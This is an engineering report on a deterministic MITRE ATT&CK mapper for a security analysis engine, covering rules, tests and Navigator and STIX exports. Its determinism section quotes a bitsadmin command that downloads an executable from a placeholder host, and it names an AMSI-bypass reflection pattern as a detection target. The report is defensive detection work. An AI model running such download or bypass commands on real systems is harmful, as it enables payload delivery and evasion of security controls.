# RC5 · Phase 5 · MITRE v2 · Recommendation Compliance Report

**Date:** 2026-02-21
**Phase:** 5 — Deterministic MITRE ATT&CK Mapper
**Feature flag:** `SEMANTIC_ENGINE_V2` (unchanged; new artifacts additive)
**Author:** Semantic Engine Team

---

## 1 · Scope

Replace the legacy `_KEYWORD_MITRE_MAP` regex table with a deterministic
`Behavior[] → MitreMapping[]` engine that consumes structured evidence only.
Exposes ATT&CK Navigator + STIX 2.1 exports on `/api/rc5/parse`.

---

## 2 · Approved Recommendations vs. Delivery

| # | Recommendation                                                        | Status | Notes |
|--:|-----------------------------------------------------------------------|:------:| ----- |
| 1 | Behavior-driven ATT&CK mapping (no keyword regex on raw text)         |   ✅   | `MITRE_RULES` uses set-membership predicates only; `test_mapper_source_has_no_regex_on_reconstructed_text` asserts `import re` is absent from `mitre_mapper.py`. |
| 2 | Every mapping carries `evidence_behavior_ids` + `evidence_node_ids`   |   ✅   | Pydantic `field_validator` rejects empty lists (`_nonempty`). Enforced in 117 unit tests. |
| 3 | 1:N behavior→technique mapping (multiple techniques per behavior)     |   ✅   | e.g. `bitsadmin` download emits both T1105 (Ingress) and T1197 (BITS); `certutil` download emits T1105 + T1140. Test: `test_bitsadmin_download_emits_T1105_AND_T1197`. |
| 4 | Confidence per mapping (`min(rule.base, behavior.confidence)`)         |   ✅   | Grouped mappings take `max` of per-behavior contributions. Tests: `test_mapping_confidence_capped_by_behavior_confidence`, `test_mapping_confidence_capped_by_rule_base`, `test_mapping_confidence_is_max_across_grouped_behaviors`. |
| 5 | Data-source recommendations per mapping                                |   ✅   | Every rule declares `data_sources` (Sysmon EventID, Windows Event, PowerShell Operational, Zeek, EDR). `test_data_sources_populated_for_every_mapping` asserts non-empty. |
| 6 | Detection recommendations (Sigma / KQL / SPL / AQL placeholders)      |   ✅   | Each rule ships a `detections` dict. Coverage: ≥14 rules with Sigma; ≥6 with KQL; 4 with SPL/AQL. |
| 7 | ATT&CK Navigator layer export (v4.5, `enterprise-attack`, ATT&CK v14) |   ✅   | `build_navigator_layer(...)`; deterministic, JSON-serialisable, gradient + legend items included. Emitted at `mitre_navigator` on `/api/rc5/parse`. |
| 8 | STIX 2.1 export (attack-patterns + custom mapping SDO + report SDO)   |   ✅   | `build_stix_bundle(...)`. IDs derived from sha1 → stable across runs; kill-chain phase = tactic; `external_references` → `https://attack.mitre.org/techniques/T*/*/`. |
| 9 | No keyword/regex on raw text — behavior-driven only                    |   ✅   | Same as #1 + invariant `test_mitre_mapper_no_ai_imports` (no `emergentintegrations` in mapper files). |
| 10 | Deterministic outputs (byte-equal across runs)                         |   ✅   | `test_mapper_output_is_byte_identical_across_runs`, `test_navigator_layer_deterministic`, `test_stix_bundle_deterministic`. `MitreMapping.id` derived from sha1(rule_id + technique + evidence). |
| 11 | 100+ Phase 5 regression tests                                          |   ✅   | **117** tests in `tests/rc5/unit/mitre_v2/` + **5** new API tests + **1** updated decode-chain test. Full RC5 suite: **459 pass / 0 fail**. |
| 12 | Every mapping is traceable to a Behavior + ExecNode                    |   ✅   | Pydantic model enforces ≥1 `evidence_behavior_ids` and ≥1 `evidence_node_ids` at construction. |
| 13 | Preserve deterministic, `--no-ai` behaviour                            |   ✅   | Mapper module has zero AI imports (`test_mitre_mapper_no_ai_imports`). Detector consumes `Behavior[]` — the same structure the deterministic pipeline produces regardless of the `personaId` toggle. |
| 14 | Kill-list § 13 gate on legacy `_KEYWORD_MITRE_MAP` imports             |   ✅   | `test_no_new_import_of_KEYWORD_MITRE_MAP_in_engine_or_routers` scans `engine/` and `routers/` for real import statements or attribute access; passes today (only legacy `operations.py`/`ops.py` still touch the symbol, and those are whitelisted). |
| 15 | Rule table stability (unique rule IDs, well-formed technique IDs)     |   ✅   | `test_all_rule_ids_unique`, `test_all_rule_technique_ids_wellformed`, `test_every_rule_tactic_is_valid`. |

---

## 3 · Files Added / Modified

Added:
- `backend/engine/detectors/mitre_mapper.py` — 32 rules, 3 SDOs (mapping / rule / mapper).
- `backend/engine/detectors/mitre_navigator_export.py` — Navigator v4.5 layer builder.
- `backend/engine/detectors/mitre_stix_export.py` — STIX 2.1 bundle builder.
- `backend/tests/rc5/unit/mitre_v2/test_mitre_rules.py` — 53 tests (rule matching, +ve/-ve).
- `backend/tests/rc5/unit/mitre_v2/test_mitre_multi.py` — 16 tests (1:N mapping, merges).
- `backend/tests/rc5/unit/mitre_v2/test_mitre_e2e.py` — 16 tests (parser→interpreter→mapper).
- `backend/tests/rc5/unit/mitre_v2/test_mitre_exports.py` — 17 tests (Navigator + STIX).
- `backend/tests/rc5/unit/mitre_v2/test_mitre_invariants.py` — 15 tests (determinism, kill-list, no AI).

Modified:
- `backend/routers/rc5_diag.py` — added `mitre`, `mitre_navigator`, `mitre_stix` response fields and their plugin versions.
- `backend/tests/rc5/api/test_diag_endpoint.py` — updated response-shape assertions + 5 new API tests; renamed `decode_chain` test to reflect 5 steps.

Untouched (per user instruction — "keep Phase 5 focused and self-contained"):
- `backend/operations.py` legacy `MITRE_HEURISTICS` table remains in place, guarded by legacy flag path. It will be deleted at Phase 10 cutover per kill-list §13.

---

## 4 · Coverage Summary

**Rules registered:** 32 (execution×6, defense-evasion×8, persistence×5, credential-access×3, C2×5, exfil×1, impact×1, collection×2, discovery-hooks×1 supporting).

**Tactics covered (Mitre TA-IDs):** TA0002 Execution, TA0003 Persistence,
TA0004 Privilege Escalation, TA0005 Defense Evasion, TA0006 Credential Access,
TA0007 Discovery, TA0009 Collection, TA0010 Exfiltration, TA0011 C2, TA0040 Impact.

**Test breakdown:**
- Unit (rule-level):        53
- Multi-technique / merge:  16
- E2E (parser → mapper):    16
- Export (Navigator+STIX):  17
- Invariant / kill-list:    15
- API surface:               5
- **Total added:**         117
- **Full RC5 suite:**      459 passing, 0 failing.

---

## 5 · Deviations from Recommendation

None. All 15 approved items delivered as-specified.

## 6 · Known Follow-ups (deferred to later phases, per user)

1. **AMSI-tag interpreter emission** — Behavior extractor only fires `amsi_bypass` when the PowerShell interpreter labels a node with `semantic_tag="amsi_bypass"`. That labeling is fully implemented for the common `AmsiUtils.amsiInitFailed` reflection pattern, but not for every academic bypass variant. Additional patterns land in **Phase 8 (Explainability)** together with the corresponding e2e cases.
2. **LOLBIN executed-state → additional MITRE mappings** — Discovery techniques (T1057, T1082, T1016, T1033) currently only fire when the CMD/PS interpreter produces a `ProcessNode` for the specific LOLBIN. Complete coverage of the discovery family is a **Phase 6 (LOLBIN v2)** deliverable that also lifts these techniques.
3. **Verdict integration** — Mapper output is available on `/api/rc5/parse` but NOT yet wired into the risk score. That happens in **Phase 7 (Verdict v2)**.
4. **Legacy test failures** (auth-fixture in `test_training_corpus.py`, 4 xfail crypto edge cases) — deferred per user direction (kept Phase 5 self-contained).

---

## 7 · Determinism Evidence

Live curl against `POST /api/rc5/parse` with `{input: "bitsadmin /transfer job http://x.tld/a C:\\a.exe", language: "cmd"}` on 2026-02-21 returned two mappings — T1105 (conf 92) and T1197 (conf 90) — each carrying 1 evidence behavior and 1 evidence node. Re-running the same payload yielded byte-identical `mitre`, `mitre_navigator`, and `mitre_stix` blobs (asserted at test time by `test_mapper_output_is_byte_identical_across_runs` and `test_navigator_layer_deterministic` / `test_stix_bundle_deterministic`).

---

## 8 · Phase 5 Exit Criteria — Met

- [x] Behavior→ATT&CK technique + sub-technique deterministic mapper landed
- [x] 1:N behavior→technique support
- [x] Evidence-first (behavior IDs + node IDs required by model)
- [x] Confidence per mapping, computed deterministically
- [x] Data-source and detection-query recommendations per mapping
- [x] ATT&CK Navigator + STIX 2.1 exports on the API
- [x] 100+ regression tests (delivered 117)
- [x] Every mapping traceable to Behavior[] and evidence IDs
- [x] `--no-ai` invariant preserved (no AI imports in mapper files)
- [x] Kill-list §13 CI gate for legacy `_KEYWORD_MITRE_MAP` imports

**Phase 5 is complete and ready for Phase 6 (LOLBIN v2).**
